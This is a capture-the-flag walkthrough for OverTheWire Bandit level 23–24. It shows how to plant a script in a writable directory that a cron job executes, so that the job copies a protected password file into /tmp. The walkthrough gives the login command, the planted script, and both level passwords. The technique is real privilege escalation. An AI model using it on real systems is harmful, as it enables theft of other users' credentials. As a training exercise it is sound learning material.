🎯 Objective:
         Exploit a cron job that executes scripts placed in a writable directory to steal the password.

Step 1: Login as bandit23

ssh bandit23@bandit.labs.overthewire.org -p 2220
Password: jc1udXuA1tiHqjIsL8yaapX5Xia1mUuH

Step 2: Inspect the cron job

Command: cat /etc/cron.d/cronjob_bandit24
It runs: /usr/bin/cronjob_bandit24.sh

Step 3: Read the script

Command: cat /usr/bin/cronjob_bandit24.sh
It executes all scripts in: /var/spool/bandit24/foo
(After that)
Scripts are deleted after execution
Output can be written to /tmp

Step 4: Create a malicious script

Create a temp script: nano /tmp/getpass.sh
Type this command:
     cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass
(Then)
Save & exit. Make it executable:
Command: chmod +x /tmp/getpass.sh

Step 5: Drop the script into the cron folder
Command: cp /tmp/getpass.sh /var/spool/bandit24/foo/

Step 6: Wait for a minute

The Cron will execute your script automatically. After that read the password.
Command: cat /tmp/bandit24_pass

Output:

Password for Level 24: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
